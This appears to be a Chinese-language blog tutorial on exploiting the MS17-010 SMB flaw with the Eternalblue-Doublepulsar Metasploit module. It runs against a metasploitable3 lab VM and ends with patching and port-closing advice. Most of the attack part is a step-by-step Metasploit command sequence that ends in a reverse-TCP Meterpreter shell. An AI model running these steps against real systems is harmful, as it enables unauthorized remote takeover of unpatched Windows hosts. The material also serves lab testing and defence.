---
title: Eternalblue-Doublepulsar完善教程
date: 2017-05-15 20:35:08
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->

## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/eternalblue_doublepulsar.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>


   Eternalblue-Doublepulsar  链接 ----->github：https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit

1.实验环境 metasploitable3 虚拟机
2.攻击环境 kali 2017
![enter description here][2]

## 扫描ms17-010 是否存在
&nbsp;
<pre>msf > use auxiliary/scanner/smb/smb_ms17_010</pre>
![enter description here][3]
&nbsp;
<pre>msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.105</pre>
![enter description here][4]
&nbsp;
![enter description here][5]
&nbsp;
<pre>exploit</pre>
![enter description here][6]
&nbsp;
可以看到ms17-010存在，并使用nmap可以看到445开启
&nbsp;
![enter description here][7]
&nbsp;
## 使用exploit——ms17-010
&nbsp;
&nbsp;
1.首先将github的项目下载来下，将eternalblue_doublepulsar.rb 拷贝到 /usr/share/metasploit-framework/modules/exploits/windows/smb目录中,并且将Eternalblue-Doublepulsar-Metasploit整个目录复制到root目录下。
&nbsp;
![enter description here][8]
&nbsp;
![enter description here][9]
&nbsp;
![enter description here][10]

2.将下载的Eternalblue-Doublepulsar-Metasploit 目录整个拷贝到 root目录下
&nbsp;
![enter description here][11]
&nbsp;
&nbsp;
3.使用exploit模块
<pre>use exploit/windows/smb/eternalblue_doublepulsar</pre>
&nbsp;
4.当执行exploit ,会出现问题时？该怎么办？
![enter description here][12]
&nbsp;

5.打开多架构支持/安装wine32

&nbsp;
<pre>wine  -h</pre>
![enter description here][13]
&nbsp;
再exploit时候。。。。
使用以下命令即可解决
<pre>dpkg --add-architecture i386 && apt-get update && apt-get install wine32</pre>
![enter description here][14]
&nbsp;
&nbsp;
&nbsp;
&nbsp;
## 设置
1.我们查看设置选项看看那些需要设置, DOUBLEPULSARPATH 和ETERNALBLUEPATH   无需设置，因为目录已经复制到root目录下了，以及target 是默认的2008 也无需设置，如果是其他版本可使用show targets 和set target 进行设置
<pre> options </pre>
![enter description here][15]
&nbsp;
2.因为目标机子是64位，所以需要进行以下设置。
<pre>set PROCESSINJECT lsass.exe </pre>
![enter description here][16]
&nbsp;
<pre> set TARGETARCHITECTURE x64</pre>
![enter description here][17]
3.设置目标ip，端口不用动，就是445
<pre>set RHOST 192.168.1.105</pre>
![enter description here][18]
&nbsp;
4.设置PAYLOAD ,因为是64位所以需要设置，如果是windows/meterpreter/reverse_tcp，会没有获取到会话
![enter description here][19]
&nbsp;
<pre>set PAYLOAD windows/x64/meterpreter/reverse_tcp</pre>
![enter description here][20]
&nbsp;
5.设置本机反向shell连接 如：
<pre>set LHOST 192.168.1.104 <pre>
![enter description here][21]
&nbsp;
6.exploit执行攻击载荷
<pre>exploit</pre>
&nbsp;
![enter description here][22]
&nbsp;
![enter description here][23]
&nbsp;
## 安全建议：

由于之前爆发过多起利用445端口共享漏洞攻击案例，运营商对个人用户关闭了445端口。因校园网是独立的，故无此设置，加上不及时更新补丁，所以在本次事件中导致大量校园网用户中招。管家提供以下安全建议：

1、关闭445、139等端口，方法详见：http://mp.weixin.qq.com/s/7kArJcKJGIZtBH1tKjQ-uA

2、下载并更新补丁，及时修复漏洞（目前微软已经紧急发布XP、Win8、Windows server2003等系统补丁，已经支持所有主流系统，请立即更新）。

XP、Windows Server 2003、win8等系统访问：http://www.catalog.update.microsoft.com/Search.aspx?q=KB4012598

Win7、win8.1、Windows Server 2008、Windows 10, Windows Server 2016等系统访问： https://technet.microsoft.com/zh-cn/library/security/ms17-010.aspx

3、安装腾讯电脑管家，电脑管家会自动开启主动防御进行拦截查杀；

4、支付比特币并不能解密文件，不要支付比特币，保留被加密的文件，等待解密。

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/20170515_065228_919.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494856015028.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494974407797.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494974439342.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494974419241.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494974332065.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494974535040.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494975511424.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494856357253.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494856504484.jpg
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494856644265.jpg
  [12]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494859066766.jpg
  [13]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/EK278L3MGQI4%28%5B_ZXDR%5D%290W.png
  [14]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494859034634.jpg
  [15]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494975438346.jpg
  [16]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494975731948.jpg
  [17]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494975929427.jpg 
  [18]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494975899435.jpg 
  [19]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494976290705.jpg 
  [20]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494976235055.jpg 
  [21]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494976395829.jpg 
  [22]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494976471479.jpg
  [23]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1494976482764.jpg